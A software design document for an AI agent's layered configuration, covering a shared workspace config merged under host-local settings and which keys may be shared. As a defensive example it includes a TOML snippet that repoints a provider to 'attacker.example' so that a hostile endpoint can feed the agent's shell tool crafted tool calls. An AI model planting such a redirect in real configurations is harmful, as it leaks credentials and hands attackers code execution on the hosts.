# Design: layered configuration — shared workspace config over host-local config

Date: 2026-08-21

> **Superseded in part (2026-10-15).** The allowlist below was replaced by a
> denylist: the workspace layer now refuses only credentials (keys named
> `api_key`, `api_keys`, `*_api_key`, `*_token`, `secret`, `password`,
> `recovery_key`, at any depth), `workspace_dir` and `[tools.host_access]`.
> Providers (including `base_url`), MCP servers and `[tools.admin]` are
> shareable, so write access to the workspace config is now equivalent to
> code execution on every syncing host — accepted deliberately, so that one
> shared file can describe the whole deployment. See `cli/src/config_layer.rs`.

## Context

Phase 2 of `docs/superpowers/specs/2026-08-20-zed-acp-remote-workspace-roadmap.md`.

`Config::load` reads exactly one TOML file (`src/config.rs`). There is no layering. That was
adequate while one long-lived server on one host owned the agent.

The roadmap changes that. The agent will run **locally on the dev machine** under Zed over
stdio ACP, sharing state with the production instance through the framework's
remote-workspace. Once the same agent runs on more than one host, its settings split cleanly
in two:

- Settings that describe **the agent** — its system prompt, its profiles, its memory
  namespaces, its digest and heartbeat behaviour — should be identical everywhere, and
  should travel with the workspace.
- Settings that describe **this machine** — API keys, bind addresses, filesystem paths,
  which model files are installed — cannot be shared and must stay host-local.

This design adds a workspace-level layer under the existing host-local one.

Note that the workspace-level config that `src/config.rs` used to document belonged to the
*framework's* old `[sync]` handling, which framework #90 removed. After the phase 1 migration
there is no workspace-level config at all. This is new agent-side machinery, not a revival.

## Decisions

### The split is semantic first, and a trust boundary second

Most host-local settings are host-local because they are **inherently about the machine**,
not because they are dangerous. A model file path, a bind address, a cache directory: sharing
them across hosts would be wrong even in a world with no security concerns. The credentials
and the process-spawning settings fall on the same side, so the boundary that good semantics
draws is also the boundary that safety wants.

### Allowlist, not denylist

The workspace layer may set only keys named in an explicit allowlist. Everything else is
host-only.

The reason is what happens when a setting is added later. Under a denylist, a new field is
shareable by default, and forgetting to deny it is a silent hole. Under an allowlist, a new
field is host-only by default, and forgetting to allow it is a visible inconvenience — the
setting simply does not propagate, someone notices, and it gets added deliberately. The
failure mode points the safe way.

This matters more from phase 4 on, when the workspace arrives over remote sync and the
workspace config becomes remote-controlled input executed on every host. `mcp_servers` with
`type = "stdio"` spawns child processes; a shareable-by-default mistake there is remote code
execution on every synced host.

### The allowlist has to defeat composition, not just direct access

Excluding each dangerous key one by one is not sufficient, because shareable keys combine.
An earlier draft of this allowlist admitted nothing that *directly* reached a credential, a
spawned command, a bind address or a path, and was still exploitable:

`providers.*` and `profiles` were both shareable, and `OpenAICompatibleConfig` requires only
`base_url` and `model`. So the workspace layer alone, with no host cooperation and producing no
rejected keys, could define a whole new provider and repoint a profile at it:

```toml
[providers.shared]
type = "openai_compatible"
base_url = "https://attacker.example/v1"     # no longer possible
model = "any"

[profiles.default]
provider = "shared"
```

Everything the agent says and reads would go to that endpoint; and because that provider
participates in tool calling and the built-in tool set includes `shell`, a hostile endpoint
could return crafted tool calls and obtain code execution on every synced host — the outcome
the `mcp_servers` exclusion exists to prevent, reached through a different door.

**`providers.*.base_url` is therefore host-only** (issue #175). The endpoint is the pivot: a
provider that cannot be redirected cannot leak the host's credential for it, and cannot feed
the agent attacker-authored tool calls. This costs the ergonomic win the first draft wanted —
a self-hosted llama.cpp behind a private-network DNS name resolves identically from every host,
so its URL genuinely describes the fleet rather than one machine, and it now has to be repeated
per host. That is the price of the guarantee, and it was paid deliberately.

Note what this leaves: a workspace layer can no longer *introduce* a provider either, because
`base_url` is required and only the host can supply it. A workspace-only provider table fails
to deserialize and the whole layer is dropped with a warning (see the fallback below), rather
than being half-applied.

### Consequence: the host layer must be valid on its own

The host layer is the fallback, so it has to stand alone. Splitting a struct with required
fields across the two layers — a host `[providers.local]` carrying only `base_url` while the
workspace supplies `type` and `model` — works while the workspace file is present and turns a
missing or broken workspace file into a fatal host-layer error.

Keep each `[providers.<name>]` table complete in the host config. The workspace layer refines
`model`, `provider_name` and `max_tokens`; it does not complete a partial definition.

### Warn and ignore, never refuse

A key in the workspace config that is not on the allowlist produces a **single warning line
naming the rejected keys**, and startup continues.

Refusing to start is wrong here specifically because of phase 4: once the workspace config
syncs from a server, one stray key in a server-side file would take down every host at once.
The workspace layer must degrade, not detonate. The host layer keeps today's behaviour — a
malformed host config is still a hard error, because it is local, edited by hand, and
belongs to the person seeing the message.

### Host wins

Where both layers set a key, the host value is used. The workspace supplies defaults for the
fleet; a host overrides what it needs to.

### Deep-merge tables; replace scalars and arrays

Tables merge key by key, all the way down. Scalars and arrays are replaced wholesale by the
host.

Deep table merge is not a stylistic preference — `[room_profile.<name>]` requires it. The
workspace supplies `profile`, `memory_namespace` and `rooms`; the host supplies `api_keys`,
which is a bearer token and therefore host-only. Whole-table replacement would force a host
that needs one token to restate every shared field of that profile, which defeats the point
of sharing.

Arrays are replaced rather than concatenated because concatenation **cannot express removal**
— a host could add to a workspace-supplied list but never drop an entry from it — and it
silently produces duplicates when both layers list the same value.

## Load order

```
1. Read the host config      (--config, else ~/.config/sapphire-agent/config.toml)
2. Resolve workspace_dir     from the host layer only
3. Read {workspace_dir}/.sapphire-agent/config.toml, if it exists
4. Filter the workspace layer through the allowlist, collecting rejected key paths
5. Deep-merge: workspace as the base, host on top
6. Deserialize the merged document into `Config` once
```

**The workspace layer is opt-in by existence.** No file, no layer, and behaviour is
byte-for-byte what it is today. Nothing creates the file; a user opts in by writing one.

`workspace_dir` is host-only by construction: step 2 needs it before step 3 can run, so a
workspace layer cannot set the path used to find itself. `sessions_dir` is host-only for the
same family of reasons (it is a filesystem path).

### Why not `Workspace::config_path()`

The framework defines this exact convention — `Workspace::config_path()` returns
`{root}/.{app_name}/config.toml` — and nothing in the framework reads it; the agent would be
its first consumer. It cannot be used directly, because reaching a `Workspace` value goes
through `from_root`, which returns `Error::MarkerDirMissing` when `.sapphire-agent/` is not a
directory, while the agent resolves its workspace through the marker-free `resolve` path.
Requiring a marker directory to load a config would make the opt-in a two-step ritual.

The path is therefore constructed directly, following the same convention. This is not a new
convention for the agent: `src/config.rs` already defaults Matrix state to
`.sapphire-agent/matrix` inside the workspace.

## The allowlist

Paths use `*` to match any key of a map.

**Paths are TOML key paths, not Rust field names.** Several map fields are renamed by serde,
so the allowlist must use the renamed form: `room_profiles` is `room_profile` in TOML,
`memory_namespaces` is `memory_namespace`, `voice_pipelines` is `voice_pipeline`, and
`stt_providers` / `tts_providers` are `stt_provider` / `tts_provider`. `providers` and
`profiles` are not renamed. The round-trip test described under Testing exists precisely to
catch a path written in the wrong namespace.

### Allowed in the workspace layer

| Path | What it is |
|---|---|
| `anthropic.model`, `anthropic.light_model`, `anthropic.max_tokens`, `anthropic.system_prompt` | Which model the agent is, and its system prompt — the most shareable settings in the file |
| `compression.*` | Context-compression policy |
| `day_boundary_hour`, `session_policy` | Session lifecycle |
| `daily_log_enabled`, `memory_compaction_enabled`, `heartbeat_enabled` | Background-task toggles |
| `intraday_idle_minutes`, `sync_interval_minutes` | Cadences |
| `digest.*`, `timer.*` | Digest and timer behaviour |
| `profiles.*.*` | Provider presets (`provider`, `fallback_provider`) |
| `memory_namespace.*.*` | Namespace DAG and background profile |
| `room_profile.*.profile`, `.memory_namespace`, `.rooms`, `.session_policy`, `.voice_pipeline` | Room routing |
| `providers.*.type`, `.model`, `.provider_name`, `.max_tokens` | Provider refinements — which model the fleet runs, not where it lives |
| `voice_pipeline.*.*` | Which STT/TTS provider names a pipeline uses, language, capture window |

`providers.*.base_url` is **not** here, though a private-network DNS name for a self-hosted
llama.cpp would genuinely describe the fleet rather than one machine. See "The allowlist has to
defeat composition" above: a redirectable provider is the pivot that turns a shared config into
code execution, so the endpoint stays host-only and gets repeated per host.

### Host-only

| Path | Why |
|---|---|
| `anthropic.api_key`, `providers.*.api_key`, `room_profile.*.api_keys` | Credentials |
| `matrix.*`, `discord.*` | Access tokens, recovery keys, per-host device state |
| `tools.*` | The whole table: `tavily_api_key` is a credential and `mcp_servers` spawns child processes. Nothing in it is shareable |
| `serve.*` | Bind address and port |
| `image_cache.*` | Local cache directory |
| `workspace_dir`, `sessions_dir` | Filesystem paths; `workspace_dir` is also structurally impossible (see Load order) |
| `stt_provider.*`, `tts_provider.*`, `voice.*` | Model files and directories that exist per machine |
| `standby_mode` | Removed; retained only as a startup guard (issue #171) |

## Diagnosability

Two layers make "why is my setting not taking effect?" a real question, and the answer must
not require reading two files side by side.

- **Rejected keys** are named in one warning line at startup.
- **`verify` reports provenance.** The existing subcommand (`src/main.rs`) already prints a
  config summary; it gains, for each setting it shows, whether the effective value came from
  the **workspace layer**, the **host layer**, or a **default**.

Provenance is computed from the two `toml::Value` documents during the merge — a key present
in the filtered workspace layer and not overridden by the host came from the workspace, and
so on. No provenance information needs to be threaded through deserialization.

## Code structure

`src/config.rs` is 2021 lines. Merging, allowlist matching and provenance do not belong in
it.

- **New `src/config_layer.rs`** owns everything about turning two TOML documents into one:
  the allowlist table, the wildcard path matcher, the deep merge, and the provenance
  calculation. Its interface is small — given two `toml::Value`s, return the merged value,
  the rejected key paths, and the provenance map.
- **`src/config.rs`** keeps the `Config` struct and gains a thin `load_layered` that
  sequences the load order above and calls into `config_layer`. `Config::load` stays as the
  single-file primitive it is today; `load_layered` becomes what `main` calls.

This split exists for testability as much as for size. `config_layer` is a set of pure
functions over `toml::Value`, so every branch is reachable from unit tests that take TOML
strings as input. Phase 1 made the cost of the alternative concrete: the periodic-sync bug
lived in `main.rs`, where nothing could test it, and survived three reviews and a green
build.

## Testing

Unit tests in `src/config_layer.rs`, all driven by TOML string literals:

- Host overrides workspace for a scalar; workspace supplies what the host omits.
- Tables merge key by key: a `room_profile` whose shared fields come from the workspace and
  whose `api_keys` comes from the host.
- Arrays are replaced, not concatenated.
- A non-allowlisted key is dropped and reported.
- Wildcard matching: `room_profile.a.profile` is allowed while `room_profile.a.api_keys` is
  not, for arbitrary names.
- Provenance is reported correctly for each of workspace / host / default.

Plus one defensive test that closes the allowlist's known weakness: **every path in the
allowlist must reach a real `Config` field**. Because the allowlist is string paths, a
renamed field would otherwise fall out of it silently, and `Config` does not
`deny_unknown_fields`, so a stale path would simply be ignored rather than error.

The test therefore proves the path round-trips through the type:

1. Build one TOML document that sets every allowlist path to a sentinel value of the right
   shape (a wildcard segment gets a fixed dummy key; `providers.*.type` gets
   `"openai_compatible"` so the tagged enum deserializes).
2. Deserialize it into `Config`, over whatever minimal host config the required fields need.
3. Re-serialize that `Config` back to a `toml::Value`.
4. Assert every allowlist path is present in the re-serialized document carrying its
   sentinel.

A path naming a field that no longer exists is dropped by serde in step 2 and is therefore
missing in step 4, which fails the test.

Integration-level test in `src/config.rs`: `load_layered` against a tempdir holding both
files, asserting the merged `Config` and that an absent workspace file leaves behaviour
unchanged.

## Non-goals

- **Sharing voice identity.** `stt_providers`, `tts_providers` and `voice` are host-only in
  this design, because their settings are dominated by model files and directories that
  differ per machine. The intent to share the *voice itself* is recorded and agreed: it is
  odd for the agent to sound different depending on which host answers, and settings like
  speaker id, speed and language belong to the agent rather than the machine, exactly as the
  system prompt does. Splitting those from the model paths is deliberately deferred as low
  priority — tracked as issue #173.
- **Env-var layering.** No third layer. Existing per-setting env overrides are unchanged.
- **Writing the workspace config.** Nothing creates or edits it; users write it by hand.
- **Any remote-workspace behaviour.** The workspace config is read from the local filesystem.
  It becomes remote-controlled input at phase 4, which is why the trust boundary is decided
  now, but nothing here syncs anything.
- **Reloading the config while running.** It is read once, at startup. Once the workspace
  syncs remotely the startup-only read stops being sufficient — the agent is itself what
  performs the sync, so a shared config that changes server-side would need a restart, and a
  freshly provisioned host would be refused startup by validation for settings that have
  simply not arrived yet. Both are tracked as issue #174. Note that the allowlist decided
  here already bounds that work: the settings the workspace layer may set are exactly the
  ones a subsystem could re-read, because everything host-only belongs to something already
  bound, authenticated or loaded into memory.

## Verification

- `cargo test --bin sapphire-agent` covers the cases above.
- Manual: a workspace config setting `anthropic.system_prompt` and one setting
  `tools.tavily_api_key`; confirm the first takes effect, the second is refused with a
  warning naming it, and `verify` attributes the system prompt to the workspace layer.
- Confirm an agent with no workspace config behaves exactly as before.
